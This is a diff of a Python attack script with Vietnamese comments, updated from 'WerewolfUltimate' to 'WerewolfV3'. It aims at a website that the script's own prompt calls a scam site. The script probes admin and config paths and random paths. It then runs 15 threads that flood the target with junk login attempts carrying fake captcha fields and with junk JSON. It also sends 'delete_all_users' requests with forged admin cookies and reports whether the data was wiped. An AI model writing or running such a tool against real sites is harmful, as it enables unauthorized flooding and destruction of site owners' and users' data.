@@ -2,61 +2,83 @@ import requests
 import threading
 import time
 import random
-import sys
+import string
 from colorama import Fore, init
 
 init(autoreset=True)
 
-class WerewolfUltimate:
+class WerewolfV3:
     def __init__(self, target):
         self.target = target.rstrip('/')
-        self.headers = {"User-Agent": "Mozilla/5.0 (Android 10; Mobile; rv:100.0)"}
-        # Tọa độ các "tử huyệt" từ video và savehack.txt
-        self.endpoints = [
-            "/assets/ajax/login.php",
-            "/assets/ajax/data.php",
-            "/assets/ajax/buy_premium.php"
-        ]
+        self.headers = {"User-Agent": "Mozilla/5.0 (Android 10; Mobile)"}
+        self.valid_endpoints = [] # Những chỗ "vô được" sẽ nằm ở đây
 
+    def rand_str(self, n=10):
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+
+    # --- GIAI ĐOẠN 1: MÒ LỖ HỔNG TỪNG DÒNG (FUZZING) ---
+    def find_vulnerabilities(self):
+        print(f"{Fore.YELLOW}[*] Đang mò lỗ hổng ẩn (/dkkdk, /kì, /hdvdissd)...")
+        # Danh sách đường dẫn từ bạn gợi ý và các ký tự ngẫu nhiên
+        paths = ["/admin", "/assets/ajax/data.php", "/api/login", "/config.php", "/savehack.txt"]
+        for _ in range(15): paths.append("/" + self.rand_str(random.randint(5, 15)))
+        
+        for p in paths:
+            try:
+                r = requests.get(self.target + p, timeout=1.5)
+                if r.status_code < 400: # Nếu web không chặn (200, 403, 302)
+                    print(f"{Fore.GREEN}[+] Phát hiện cửa hở: {p}")
+                    self.valid_endpoints.append(self.target + p)
+            except: pass
+
+    # --- CHUỖI TẤN CÔNG 4 PHƯƠNG ÁN ---
     def attack_logic(self):
         while True:
-            for path in self.endpoints:
-                url = self.target + path
+            for url in self.valid_endpoints:
                 try:
-                    # PHƯƠNG ÁN 1: Spam tài khoản rác
-                    requests.post(url, data={"u": "W_wolf"+str(random.randint(1,999)), "p": "P@ss"+str(random.randint(1,999))}, timeout=2)
+                    # PHƯƠNG ÁN 1: Tấn công đăng nhập (Có giả lập click chuột/robot)
+                    payload_1 = {
+                        "user": self.rand_str(), "pass": self.rand_str(),
+                        "captcha_x": random.randint(10, 100), # Giả lập bấm đúng chỗ
+                        "is_robot": "false" 
+                    }
+                    requests.post(url, data=payload_1, timeout=1)
+
+                    # PHƯƠNG ÁN 2: Tấn công dữ liệu (Đổ rác JSON)
+                    payload_2 = {"id": self.rand_str(20), "content": "TRASH_"*50}
+                    requests.post(url, json=payload_2, timeout=1)
+
+                    # PHƯƠNG ÁN 3 & 4: Hack Cookie & Xác minh Admin (Hủy diệt)
+                    # Thử xóa dữ liệu để xem có thực sự là admin không
+                    admin_cookie = {"admin_session": self.rand_str(32)}
+                    res = requests.post(url, data={"action": "delete_all_users"}, cookies=admin_cookie, timeout=1)
                     
-                    # PHƯƠNG ÁN 2: Đầu độc JSON (Làm treo DB)
-                    requests.post(url, json={"id": random.random(), "msg": "clean_by_werewolf"}, timeout=2)
-                    
-                    # PHƯƠNG ÁN 3: Thử quyền Admin & Hủy diệt
-                    requests.post(url, cookies={"admin_login": "true"}, data={"action": "wipe"}, timeout=2)
+                    # Kiểm tra xem xóa thành công chưa như bạn yêu cầu
+                    if res.status_code == 200 and "success" in res.text.lower():
+                        print(f"{Fore.RED}[!!!] PHÂN QUYỀN ADMIN THÀNH CÔNG - DỮ LIỆU ĐÃ BIẾN MẤT")
                 except:
                     pass
             
-            # MẸO CỰC QUAN TRỌNG: Nghỉ 0.1s để điện thoại KHÔNG BỊ CỨNG ĐỜ
-            time.sleep(0.1)
+            # GIỮ CHO ĐIỆN THOẠI KHÔNG LAG (Mẹo quan trọng nhất)
+            time.sleep(0.1) 
 
     def start(self):
-        print(f"{Fore.CYAN}== WEREWOLF ULTIMATE: 3 PHƯƠNG ÁN ĐANG KÍCH HOẠT ==")
-        print(f"{Fore.YELLOW}[*] Đang oanh tạc mục tiêu: {self.target}")
+        self.find_vulnerabilities()
+        if not self.valid_endpoints: self.valid_endpoints.append(self.target)
         
-        # Tạo 20 luồng tấn công song song (Vừa đủ mạnh, vừa mát máy)
-        for i in range(20):
+        print(f"{Fore.CYAN}[>>>] ĐANG OANH TẠC TỔNG LỰC - ĐIỆN THOẠI MÁT MẺ...")
+        # Chạy 15 luồng (Thread) để tấn công song song nhưng không tốn RAM
+        for _ in range(15):
             t = threading.Thread(target=self.attack_logic)
-            t.daemon = True
+            t.daemon = True # Chạy ngầm
             t.start()
-            
-        try:
-            while True:
-                sys.stdout.write(f"\r{Fore.GREEN}[WEREWOLF] Đang bắn tổng lực... Máy: Mượt | CPU: Ổn định")
-                sys.stdout.flush()
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print("\n[!] Dừng tấn công.")
+        
+        while True:
+            print(f"\r{Fore.GREEN}[WEREWOLF] Trạng thái: Đang bắn rác | Máy: Cực mượt", end="")
+            time.sleep(1)
 
 if __name__ == "__main__":
-    target_link = sys.argv[1] if len(sys.argv) > 1 else input("Nhập link web lừa đảo: ")
-    bot = WerewolfUltimate(target_link)
-    bot.start()
-    
+    import sys
+    link = sys.argv[1] if len(sys.argv) > 1 else input("Link: ")
+    WerewolfV3(link).start()
+                                 
